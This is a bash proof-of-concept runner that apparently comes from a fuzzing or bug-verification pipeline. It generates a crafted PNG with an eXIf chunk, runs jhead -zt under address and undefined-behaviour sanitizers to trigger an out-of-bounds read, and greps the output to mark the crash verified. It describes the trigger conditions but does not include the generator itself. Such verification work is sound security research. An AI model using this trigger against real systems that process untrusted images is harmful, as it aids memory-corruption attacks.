#!/usr/bin/env bash
# PoC runner for VULN 002: ExifBytesActuallyUsed Negative-Index OOB Read for PNG
# Trigger: jhead -zt on a crafted PNG with eXIf chunk containing minimal EXIF
#          (ThumbnailOffset=0, ThumbnailSize=0) and all-zero trailing bytes.
# The -zt flag invokes TrimImgExifTrailingZeros -> ExifBytesActuallyUsed where
# the loop checks ExifData[NewSize-1] before the NewSize<=ThumbnailEndIndex guard.
#
# Note: The binary also has a separate UBSAN-reported issue in ReadPngSections
# (left shift of 1 by 31: pngfile.c:171). We run with halt_on_error=0 so
# execution continues to ExifBytesActuallyUsed even when that fires first.

set -uo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
JHEAD="/data/ylwang/non-textfuzz/target/jhead/build_test/jhead"
INPUT_PNG="$DIR/vuln_002_input.png"
RESULT="$DIR/result.txt"
STATUS_FILE="$DIR/vuln_002_status.txt"

echo "[*] Working directory: $DIR"

# Step 1: Generate the malicious PNG
echo "[*] Generating crafted PNG with eXIf chunk..."
python3 "$DIR/vuln_002_gen.py"
echo "[+] PNG generated: $INPUT_PNG"

# Work on a copy so jhead -zt does not overwrite our original
WORK_PNG="$DIR/vuln_002_work.png"
cp "$INPUT_PNG" "$WORK_PNG"

# Step 2: Run jhead -zt with ASAN/UBSAN and capture output
# Use halt_on_error=0 so execution continues past the ReadPngSections UBSAN
# issue and reaches ExifBytesActuallyUsed (visible via "Trimming N bytes" output).
# The -zt flag is required to reach TrimImgExifTrailingZeros -> ExifBytesActuallyUsed.
echo "[*] Running: $JHEAD -zt $WORK_PNG"
ASAN_OPTIONS="halt_on_error=0:detect_leaks=0" \
UBSAN_OPTIONS="halt_on_error=0:print_stacktrace=1" \
    "$JHEAD" -zt "$WORK_PNG" > "$RESULT" 2>&1 || true

echo "[*] Output saved to $RESULT"
cat "$RESULT"

# Step 3: Determine status
echo ""
echo "[*] Checking for sanitizer errors..."

if grep -qiE "(AddressSanitizer|heap-buffer-overflow|heap-underflow|heap-underread|stack-buffer-overflow|SEGV|UndefinedBehaviorSanitizer|runtime error|READ of size|WRITE of size|underread)" "$RESULT" 2>/dev/null; then
    echo "[!] ASAN/UBSAN ERROR DETECTED"
    echo "VERIFIED_CRASH" > "$STATUS_FILE"
elif grep -qiE "(Segmentation fault|Abort|Bus error|SIGSEGV|SIGABRT)" "$RESULT" 2>/dev/null; then
    echo "[!] CRASH DETECTED (signal)"
    echo "VERIFIED_CRASH" > "$STATUS_FILE"
else
    echo "[?] No sanitizer errors found in output."
    echo "UNVERIFIED" > "$STATUS_FILE"
fi

echo "[*] Status: $(cat "$STATUS_FILE")"
echo "[*] Done."
